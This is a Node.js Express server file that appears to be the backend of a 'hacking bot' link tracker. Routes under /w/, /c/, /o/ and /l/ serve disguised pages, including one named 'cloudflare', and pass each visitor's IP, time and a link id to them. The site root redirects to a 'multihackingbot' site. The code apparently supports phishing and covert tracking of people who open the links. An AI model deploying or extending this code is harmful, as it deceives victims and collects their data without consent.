var express = require('express');
var bodyParser = require('body-parser');
var cors = require('cors');
var path = require('path');
const ejs = require("ejs");
var app = express();
var PORT = process.env.PORT || 3000;
var hostURL = 'https://picrypto.in';
var hostURL2 = hostURL;
var use1pt = false;
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));
function getIp(req) {
  return req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || req.ip;
}
function handleRoute(view, host) {
  return (req, res) => {
    var b = (typeof req.query.b === "string" && req.query.b.trim() !== "") ? req.query.b.trim() : "qq6rytlk";
    var ip = getIp(req);
    var d = new Date().toJSON().slice(0, 19).replace("T", ":");
    var renderData = { ip, time: d, url: host + "/crash", uid: req.params.path, a: host, b, t: use1pt };
    res.render(view, renderData);
  };
}
app.get('/use-cases-and-policies', (req, res) => res.render('public'));
app.get('/w/:path', handleRoute('webview', hostURL));
app.get('/c/:path', handleRoute('cloudflare', hostURL2));
app.get('/o/:path', handleRoute('ok', hostURL2));
app.get('/l/:path', handleRoute('cg', hostURL2));
app.get('/crash', (req, res) => res.render('crash'));
app.get('/', (req, res) => res.redirect('https://multihackingbot.onrender.com'));
app.get('/_health', (req, res) => res.json({ status: 'ok', time: new Date().toISOString() }));
app.listen(PORT, () => {
  console.log('Server listening on port', PORT);
  console.log('hostURL:', hostURL, 'use1pt:', use1pt);
});
